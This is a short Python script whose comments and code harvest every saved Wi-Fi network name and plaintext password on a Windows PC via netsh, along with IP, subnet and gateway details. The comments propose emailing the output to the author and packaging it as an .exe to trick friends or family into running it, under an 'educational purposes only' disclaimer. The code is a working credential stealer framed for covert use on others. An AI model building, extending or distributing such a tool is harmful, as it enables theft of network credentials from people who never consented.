#About The Code 
#this code allows you to get the names of the wifi and passwords that the users PC has ever connected with
#code also outputs the IPv4,Subnet Mask and the Default Gateway of the users PC

#Further Building 
#you can build up on this by adding a mail client in the code which sends you the output through mail
#then finally converting the whole file in an ".exe" file to play a small trick on your friends or family members
#by making them run the command and you getting all in the info in your mail 

#I take no responsibly on the use of this code for illegal stuff,this is purely for educational purposes only

#Main Code Starts Below 

import subprocess

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

for wifi in wifis:
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
	results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]

	try:
		print(f'Name : {wifi}\t\tPassword : {results[0]}')

	except :
		print(f'Name : {wifi}\t\tPassword : Unable to get the passowrd ')
ip_data = subprocess.check_output(['ipconfig']).decode('utf-8').split('\n')
ipv4 = [line.split(':')[1][1:-1] for line in ip_data if "IPv4 Address" in line]
subnet = [line.split(':')[1][1:-1] for line in ip_data if "Subnet Mask" in line]
gateway = [line.split(':')[1][1:-1] for line in ip_data if "Default Gateway" in line]

print(f'IPv4 Address. . . . . . . . . . . : {ipv4[0]}\nSubnet Mask . . . . . . . . . . . : {subnet[0]}\nDefault Gateway . . . . . . . . . : {gateway[0]}')

